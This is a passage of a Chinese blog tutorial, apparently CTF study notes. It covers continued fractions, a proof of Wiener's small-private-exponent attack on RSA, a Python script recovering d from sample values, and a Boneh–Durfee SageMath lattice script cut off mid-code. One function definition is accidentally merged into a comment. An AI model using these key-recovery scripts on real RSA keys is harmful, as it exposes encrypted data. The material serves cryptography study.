title="连分数知识相关"></a>连分数知识相关</h2><p>相关理论知识百度百科就有，这里直接上过程，挺好懂得。</p><p><img src="https://i.loli.net/2020/12/18/qwbjNIno1CluT5p.jpg" alt="img"></p><p>连分数就是用分数去表示一个小数叭。如果是个无限不循环小数，那么连分数就会无限得去逼近它。如果不是无限不循环小数，那么连分数得最后一项就是该小数的分数表示。</p><p>可能不懂哪来的项，什么是最后一项。</p><p>直接那上述的例子，你可以认为，连分数的</p><p>第一项就是3，和3.245差很大叭</p><p>第二项是$3\frac1 4=3.25$，只差0.005了</p><p>第三项是$3 \frac 1 {4+\frac 1 {12}}=3\frac {12} {49}=3.24489$,差更少了</p><p>最后一项就是准确表示了。</p><h2 id="wiener‘s-Attack"><a href="#wiener‘s-Attack" class="headerlink" title="wiener‘s Attack"></a>wiener‘s Attack</h2><p>摘自<a href="https://www.ams.org/notices/199902/boneh.pdf" target="_blank" rel="noopener">二十年以来对 RSA 密码系统攻击综述</a></p><p>令$N=pq$且$q&lt;p&lt;2q$，$d&lt;\frac13N^{\frac14}$，给定$⟨N,e⟩$且满足$ed=1 \pmod {φ(N)}$，攻击者可以有效计算出$d$。</p><h3 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h3><p>证明基于使用连分数的逼近，由于$ed=1 \pmod {φ(N)}$，那么存在一个$k$满足$ed−kφ(N)=1$。所以，</p><p>$\vert \frac{e}{φ(N)}-\frac kd \vert= \frac 1 {dφ(N)}$，因此，$\frac kd $是$\frac e {φ(N)}$的逼近，尽管我们不知道$φ(N)$，但是我们可以用$N$来近似。</p><p>因为$φ(N)=(p−1)(q−1)=pq−p−q+1=N−p−q+1$，又$p+q−1&lt;3\sqrt N $所以我们有$|N−φ(N)|&lt;3\sqrt N$</p><p>使用$N$替换$φ(N)$，我们得到：</p><p>$\vert \frac e N - \frac k d\vert = \vert \frac{ed - kN}{Nd}\vert = \vert \frac{ed - kφ(N)-kN+kφ(N)}{Nd}\vert=\vert \frac {1-k(N-φ(N))}{Nd}\vert ≤ \vert \frac{3k\sqrt{N}}{Nd}\vert =\frac{3k}{d\sqrt N}$</p><p>现在，$kφ(N)=ed−1&lt;ed$，因为$e&lt;φ(N)$，我们知道$k&lt;d&lt;\frac13N^{\frac14}$（译者注：可以得到$3k&lt;3d&lt;N^{\frac 14}和dN^{\frac 14}&gt;3d^2$）。因此我们得到：</p><p>$\vert \frac e N - \frac k d\vert ≤ \frac{3k}{d\sqrt N}&lt;\frac {N^{\frac1 4}}{d\sqrt N}≤\frac 1 {dN^{\frac 14}}&lt; \frac 1{3d^2}$</p><p>这是一个经典的逼近关系，分数$\frac k d$且$d&lt;φ(N)$在$log_2N$约束内非常逼近$\frac e N$。实际上，所有类似$\frac k d$这样的分数都是$\frac e N$的连分数展开的收敛。因此我们首要做的便是计算$\frac e N$的连分数的$logN$收敛，其中一个连分数就等于$\frac k d$。因为$ed−kφ(N)=1$，我们有$gcd(k,d)=1$，因此$\frac k d$是一个最简分数。这是可以算出密钥d的线性时间算法。</p><p>(至于为啥d的上界是那个，别问我，找wiener问去。)</p><p>下面是python的代码实现</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def transform(<span class="keyword">x</span>,<span class="keyword">y</span>):       <span class="comment">#使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res=[]</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">y</span>:</span><br><span class="line">        res.append(<span class="keyword">x</span>//<span class="keyword">y</span>)</span><br><span class="line">        <span class="keyword">x</span>,<span class="keyword">y</span>=<span class="keyword">y</span>,<span class="keyword">x</span>%y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">def continued_fraction(sub_res):</span><br><span class="line">    numerator,denominator=<span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in sub_res[::-<span class="number">1</span>]:      <span class="comment">#从sublist的后面往前循环</span></span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator,numerator   <span class="comment">#得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#求解每个渐进分数def sub_fraction(x,y):</span></span><br><span class="line">    res=transform(<span class="keyword">x</span>,<span class="keyword">y</span>)</span><br><span class="line">    res=list(<span class="keyword">map</span>(continued_fraction,(res[<span class="number">0</span>:i] <span class="keyword">for</span> i in range(<span class="number">1</span>,len(res)))))  <span class="comment">#将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#以上是获得e/n的连分数</span></span><br><span class="line"></span><br><span class="line">def get_p<span class="string">q(a,b,c)</span>:      <span class="comment">#由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par=gmpy2.isqrt(b*b-<span class="number">4</span>*a*c)   <span class="comment">#由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1,x2=(-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1,x2</span><br><span class="line"></span><br><span class="line">def wienerAttack(e,n):</span><br><span class="line">    <span class="keyword">for</span> (d,k) in sub_fraction(e,n):  <span class="comment">#用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:                     <span class="comment">#可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-<span class="number">1</span>)%k!=<span class="number">0</span>:             <span class="comment">#ed=1 (\pmod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        phi=(e*d-<span class="number">1</span>)//k               <span class="comment">#这个结果就是 φ(n)</span></span><br><span class="line">        px,qy=get_p<span class="string">q(1,n-phi+1,n)</span></span><br><span class="line">        <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,<span class="keyword">q</span>=<span class="keyword">abs</span>(<span class="keyword">int</span>(px)),<span class="keyword">abs</span>(<span class="keyword">int</span>(qy))     <span class="comment">#可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d=gmpy2.invert(e,(p-<span class="number">1</span>)*(<span class="keyword">q</span>-<span class="number">1</span>))     <span class="comment">#求ed=1 (\pmod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"该方法不适用"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = <span class="number">14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span></span><br><span class="line">n = <span class="number">33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span></span><br><span class="line">d = wienerAttack(e,n)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"d="</span>,d)</span><br></pre></td></tr></table></figure><h2 id="Wiener‘s-Attack失效时"><a href="#Wiener‘s-Attack失效时" class="headerlink" title="Wiener‘s Attack失效时"></a>Wiener‘s Attack失效时</h2><p>失效就是意味着界限不满足，而现存的有许多基于Wiener‘s Attack的变型算法就是用来尽量扩大这个界限的。这里是Boneh Durfee Attack的脚本，需要用到多元coppersmith的原理（俺不会，略略略）</p><p>利用条件：已知给出n,e,c  （e很大）  (boneh_durfee.sage)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct</span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, modulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">"* removing unhelpful vector"</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print(<span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span><span class="params">(pol, modulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"failure"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        print(<span class="string">"We do not have det &lt; bound. Solutions might not be found."</span>)</span><br><span class="line">        print(<span class="string">"Try with highers m and t."</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span 